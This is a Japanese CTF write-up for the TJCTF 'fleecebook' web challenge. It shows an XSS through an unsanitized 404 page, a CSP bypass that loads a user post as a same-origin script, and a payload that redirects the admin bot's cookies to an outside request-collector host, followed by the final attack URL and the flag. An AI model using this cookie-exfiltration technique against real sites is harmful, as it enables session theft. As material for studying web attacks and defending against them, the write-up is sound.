# fleecebook:web:378pts
I made a place to post all you want about fleece!  
I guess you could say, it's kinda meta...  
[fleecebook.tjc.tf](https://fleecebook.tjc.tf/)  
[Admin Bot](https://admin-bot.tjctf.org/fleecebook)  

Downloads  
[admin-bot.js](admin-bot.js)　[server.zip](server.zip)  

# Solution
XSS問題セットとソースが渡される。  
アクセスすると謎のfleece推しサイトが出てきた(マウスポインタもfleeceである…)。  
fleecebook  
[site.png](site/site.png)  
`/post`にてタイトルとコンテンツが投稿できるがサニタイズされている。  
ここでソースを見ると以下のようであった。  
```python
~~~
@app.errorhandler(404)
def not_found(e):
    return 'your fleece page (' + request.path + ') could not be found :notlikefleececry:'
~~~
```
404エラーページではサニタイズが見られない。  
```bash
$ curl "https://fleecebook.tjc.tf/%3Cs%3E"
your fleece page (/<s>) could not be found :notlikefleececry:
```
タグの挿入に成功するが、CSPにて`script-src 'self'`とされているためインラインscriptタグでのXSSなどはできないようだ。  
同一オリジンにjsなどをアップロードしてXSSを行う方針をとる。  
ここで、`/post`にて任意のタイトルとコンテンツを投稿できることを思い出す。  
これをjsとして読み込めばよい。  
通常のテキストを投稿したものは以下のような形式であった。  
```

    title - 2022-05-15 02:45:44
    <br>
    content
    
```
`<br>`などが邪魔だがコメントアウトすればよい。  
リクエストは[RequestBin.com](https://requestbin.com/)で受け取る。  
サニタイズされるため、シングルクォートやダブルクォートなどは利用できない。  
titleを  
```
location.href=`https://xxxxxxxxxxxxx.x.pipedream.net?s=`+document.cookie; /*
```
contentを  
```
*/
```
とし、投稿を行う。  
これにより、リダイレクトを行いcookieを取得するjsが設置できた。  
生成したURLは`https://fleecebook.tjc.tf/post/b7515134-68ff-48ab-986d-d8684602c571`である。  
```bash
$ curl https://fleecebook.tjc.tf/post/b7515134-68ff-48ab-986d-d8684602c571

    location.href=`https://endetltc6t33d.x.pipedream.net?s=`+document.cookie; /* - 2022-05-15 02:52:55
    <br>
    */
    
```
これを404ページよりscriptのsrcとして読み込む。  
最終的にXSSを行うURLは、
```
https://fleecebook.tjc.tf/static/"><script src='https://fleecebook.tjc.tf/post/b7515134-68ff-48ab-986d-d8684602c571'></script>
```
となる。  
これをAdmin Botに送信する。  
CSPがバイパスでき、`/?s=flag=tjctf{s3a_e5s_p3A_5a1d68d16c7e1d2a}`なるflagを含むリクエストを受信した。  

## tjctf{s3a_e5s_p3A_5a1d68d16c7e1d2a}